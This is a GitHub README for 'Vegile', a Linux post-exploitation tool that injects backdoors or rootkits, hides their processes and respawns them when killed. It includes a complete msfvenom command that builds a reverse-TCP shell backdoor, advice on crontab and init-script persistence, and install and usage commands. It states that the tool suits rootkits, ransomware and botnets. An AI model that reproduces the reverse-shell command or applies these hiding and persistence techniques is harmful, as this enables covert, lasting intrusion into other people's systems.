# Vegile - Ghost In The Shell

[![Version](https://img.shields.io/badge/Vegile-Beta-brightgreen.svg?maxAge=259200)]()
[![Stage](https://img.shields.io/badge/Release-Stable-brightgreen.svg)]()
[![Build](https://img.shields.io/badge/Supported_OS-Linux-orange.svg)]()

**Vegile** is a tool for **Post exploitation** Techniques in linux. Post Exploitation techniques will ensure that we maintain some level of **access and can potentially** lead to **deeper** footholds into our targets **trusted network**.


<img src="https://user-images.githubusercontent.com/17976841/34869598-fd7cf00e-f7b9-11e7-950e-a4cb61364c03.png" ></img>

### Donate
- If this project is very helpful to your penetration testing and u want to support me , you can give me a cup of coffee :)
- [![Donation](https://img.shields.io/badge/bitcoin-donate-yellow.svg)](https://blockchain.info/id/address/1NuNTXo7Aato7XguFkvwYnTAFV2immXmjS)



## :book: How it works

This tool will set up your ***backdoor/rootkits***
when backdoor is already setup it will be ***hidden*** your specific process,***unlimited*** your ***session*** in metasploit and ***transparent***. Even when it is **killed**, it will **re-run again**. There will always be a procces which will **run** another process, so we can assume that this procces is **unstopable** like a **Ghost in The Shell**

#### READ THIS

- Right now I just tested backdoor with msfvenom command using reverse_shell and my manual backdoor for linux [ **it works** ] or you can use thefatrat for to help you create a simple backdoor
- **msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=IP LPORT=PORT -b "\x00" -f elf -o NAME_BACKDOOR**
- for hidden process you can use for **rootkits,backdoor,ransom and botnet** { sh,python,perl,exe and binary }.
- Victim  target all linux distribution include ( **base32** and **base64** in their system ) 
- For get persistence you can use **crontab and xinit.d** into your backdoor  
- this is just a simple algorithm how we can maintain our sessions and backdoor/rootkits , **you can explore this**



## Getting Started
1. ```git clone https://github.com/garcyber/chimera-tools.git```
2. ```cd Vegile```
3. ```chmod +x Vegile```

## Using Vegile
Running Vegile without any parameters will give a helpful list of the most common options. you can use command : 

- Vegile -i / --inject  **[backdoor/rootkit]**
- Vegile -u / --unlimited **[backdoor/rootkit]**
- Vegile -h / --help 

## Demo Video

- [![Vegile demo](https://user-images.githubusercontent.com/17976841/34897525-f91afc1a-f820-11e7-9f85-bb0a5f00b4e3.JPG)](https://www.youtube.com/watch?v=oYyH1G3Lsvo "Vegile Demo ")

- [![Vegile demo](https://user-images.githubusercontent.com/17976841/34897524-f887a258-f820-11e7-9ceb-a39da5be6fdf.JPG)](https://www.youtube.com/watch?v=imlh8l5w56k "Vegile Demo ")
